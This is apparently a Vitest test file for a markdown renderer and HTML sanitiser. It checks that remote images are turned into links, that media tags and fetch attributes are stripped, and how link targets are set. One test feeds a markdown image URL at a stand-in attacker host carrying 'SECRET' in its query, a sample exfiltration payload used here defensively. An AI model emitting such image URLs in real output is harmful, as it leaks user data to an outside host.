import { describe, expect, it } from "vitest";
import { renderMarkdown, sanitizeHTML } from "./markdown";

describe("renderMarkdown", () => {
  it("turns remote images into links when remote media is off", () => {
    const html = renderMarkdown("![x](https://attacker.example/c?d=SECRET) ![y](/api/files/a.png)", {
      remoteMedia: false,
    });
    expect(html).not.toContain("<img src=\"https://attacker.example");
    expect(html).toContain('href="https://attacker.example/c?d=SECRET"');
    expect(html).toContain('<img src="/api/files/a.png"');
  });

  it("keeps remote images in document previews", () => {
    expect(renderMarkdown("![x](https://example.com/a.png)")).toContain(
      '<img src="https://example.com/a.png"',
    );
  });

  it("drops media tags and fetch attributes beyond img src", () => {
    const html = sanitizeHTML(
      '<video poster="https://e.x/p.png"></video><audio src="https://e.x/a"></audio>' +
        '<img src="/a.png" srcset="https://e.x/b.png 2x">',
    );
    expect(html).not.toMatch(/video|audio|poster|srcset|e\.x/);
  });

  it("opens external links in a new tab, node links in place", () => {
    const html = renderMarkdown("[out](https://example.com) [[proj/n1|in]]");
    const doc = new DOMParser().parseFromString(html, "text/html");
    const [out, node] = Array.from(doc.querySelectorAll("a"));
    expect(out.target).toBe("_blank");
    expect(out.rel).toBe("noopener noreferrer");
    expect(node.hasAttribute("data-node-link")).toBe(true);
    expect(node.target).toBe("");
  });
});
